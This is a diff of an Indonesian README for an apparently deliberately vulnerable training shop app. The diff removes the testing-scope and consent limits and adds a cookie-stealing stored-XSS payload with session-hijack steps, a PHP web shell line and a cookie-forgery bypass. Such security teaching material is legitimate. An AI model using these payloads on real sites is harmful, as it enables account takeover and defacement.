@@ -52,17 +52,8 @@ tokokita-web/
 ├── server.py        # backend + sengaja rentan
 ├── tests/smoke_test.py
 ├── uploads/         # hasil unggahan (dibuat otomatis)
-├── tokokita.db      # SQLite akun/pesanan/review
-└── tokokita-lab.db  # SQLite terpisah, empat fixture sqlmap
+└── tokokita.db      # SQLite (dibuat otomatis, seed di server.py)
 ```
-
-Kedua database dibuat otomatis saat server pertama dijalankan.
-
-## Cakupan temuan
-
-Ada **6 kategori kelemahan aplikasi**: SQL injection, stored XSS, kelemahan perlindungan sesi, manipulasi harga client-side, IDOR pesanan, dan upload tanpa validasi. SQLi memiliki dua skenario (login dan fixture sqlmap). Shell upload adalah simulasi dampak, bukan RCE. Nmap hanya recon server lokal, bukan kerentanan aplikasi.
-
-Semua pengujian publik harus dibatasi ke aplikasi TokoKita. Jangan scan Railway/hosting, jaringan, metadata service, atau target pihak lain. Untuk sqlmap gunakan endpoint fixture di localhost saja.
 
 ## Celah yang disengaja
 
@@ -83,29 +74,28 @@ SELECT ... FROM users WHERE password = '<pass>' AND username = '<user>'
 Di Burp, request-nya `POST /api/login` dengan body JSON. Payload rusak akan
 membocorkan pesan `SQL error: ...` di response (error-based SQLi).
 
-### 2. Stored XSS + sesi demo yang lemah
+### 2. Stored XSS — curi cookie sesi admin
 
-Review disimpan lalu dirender sebagai HTML tanpa escape; cookie `PHPSESSID`
-sengaja tidak memakai `HttpOnly`. Payload dapat berjalan di browser yang membuka
-review tersebut. Untuk latihan lokal, gunakan payload visual:
-
-```html
-<img src=x onerror="alert('Stored XSS demo')">
-```
-
-Collector demo hanya menerima cookie yang mengandung pasangan tepat `user=kamila`
-dan maksimal 1024 karakter. Alur collector dua-browser hanya untuk sesi admin
-Kamila yang dikendalikan presenter dan dengan persetujuannya. Jangan kumpulkan
-cookie pembeli/pengunjung, jangan tempel token ke sistem lain, dan segera reset
-review setelah adegan.
+Cookie `PHPSESSID` sengaja **tanpa `HttpOnly`**, dan ulasan dirender dengan
+`innerHTML` tanpa escape. Kirim ulasan di halaman produk:
 
 ```html
-<img src=x onerror="if(document.cookie.includes('user=kamila'))fetch('/api/collect?c='+encodeURIComponent(document.cookie))">
+<img src=x onerror="fetch('/api/collect?c='+encodeURIComponent(document.cookie))">
 ```
 
-Cookie `user` juga dipercaya sebagai fallback identitas; itu kelemahan sesi
-terpisah. Jangan gunakan jalur bypass tersebut untuk sesi atau akun di luar
-fixture demo. Detail alur dan batasnya: [`docs/demo-runbook.md`](docs/demo-runbook.md).
+Saat Kamila membuka produk itu, cookie-nya terkirim ke halaman penyerang:
+<http://127.0.0.1:8000/collector>
+
+Tempel nilai cookie yang masuk ke DevTools → *Storage/Application → Cookies*
+(atau lewat Console), reload, lalu buka **Dashboard Penjual**. Ganti nama toko
+jadi `TOKO DIHACK` — perubahan tersimpan di server.
+
+Jalur cadangan kalau XSS gagal saat live (cookie `user` dipercaya apa adanya):
+
+```js
+document.cookie = "user=kamila; path=/";
+location.reload();
+```
 
 ### 3. Harga checkout dari client
 
@@ -131,10 +121,9 @@ mengecek pemilik.
 
 ### 5. Upload file → shell PHP (simulasi)
 
-Di halaman Profil, unggah file teks dummy bernama `shell.php` (tidak perlu isi
-kode PHP). Server tidak memvalidasi ekstensi. Handler hanya menampilkan output
-hard-coded; tidak ada perintah yang dieksekusi. Gunakan lokal saja karena upload
-publik meninggalkan artefak sampai container/file dibersihkan. Buka:
+Di halaman Profil, unggah file bernama `shell.php` (isi bebas, misalnya
+`<?php system($_GET['cmd']); ?>` — **tidak akan dieksekusi**). Server tidak
+memvalidasi ekstensi. Buka:
 
 ```
 http://127.0.0.1:8000/uploads/shell.php?cmd=whoami
@@ -161,7 +150,7 @@ ia tidak mengakses akun, pesanan, ulasan, atau data penjual. Untuk langkah uji l
 | POST | `/api/logout` | hapus sesi |
 | GET | `/api/me` | user yang sedang login |
 | GET | `/api/reviews?pid=1` | ulasan (**XSS**) |
-| POST | `/api/reviews` | simpan ulasan mentah (stored XSS demo) |
+| POST | `/api/reviews` | simpan ulasan mentah |
 | POST | `/api/checkout` | **harga dari client** |
 | GET | `/api/orders/mine` | pesanan milik sendiri |
 | GET | `/api/orders/<id>` | **IDOR** |
@@ -172,7 +161,8 @@ ia tidak mengakses akun, pesanan, ulasan, atau data penjual. Untuk langkah uji l
 | POST | `/api/seller/store` | admin: ubah nama toko |
 | POST | `/api/seller/reset` | admin: pulihkan data seed |
 | POST | `/api/upload?name=...` | **upload tanpa validasi** |
-| GET | `/api/collect?c=...` | collector cookie; hanya menerima `user=kamila`, maks. 1024 karakter |
-| GET | `/collector` | halaman bukti collector demo |
+| GET | `/api/collect?c=...` | penampung cookie XSS (1×1 GIF) |
+| GET | `/collector` | halaman "laptop penyerang" |
 
-Sesi disimpan di memori: restart server = login ulang. Akun/pesanan/ulasan dan harga toko disimpan di `tokokita.db`; empat produk sqlmap ada di `tokokita-lab.db`. Upload berada di `uploads/`. Reset API tidak menghapus upload, data collector in-memory, atau database lab.
+Sesi disimpan di memori: restart server = login ulang. Akun/pesanan/ulasan
+disimpan di `tokokita.db`.
